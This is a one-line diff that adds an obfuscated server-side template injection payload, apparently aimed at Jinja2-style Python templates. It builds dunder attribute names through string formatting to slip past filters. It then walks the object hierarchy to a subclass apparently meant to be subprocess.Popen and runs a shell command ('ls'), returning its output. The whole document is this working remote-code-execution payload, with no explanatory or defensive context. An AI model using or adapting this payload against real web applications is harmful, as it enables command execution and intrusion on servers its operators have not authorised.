@@ -1,0 +1,1 @@
+['%s%s' % ('req', 'uest')]{{''['_%s%s'%('_class_','_')]['_%s%s'%('_mro_','_')][0x1]['_%s%s'%('_subclasses_','_')]()[0x162]('ls',shell=True,stdout=-1).communicate()[0x0].strip()}}
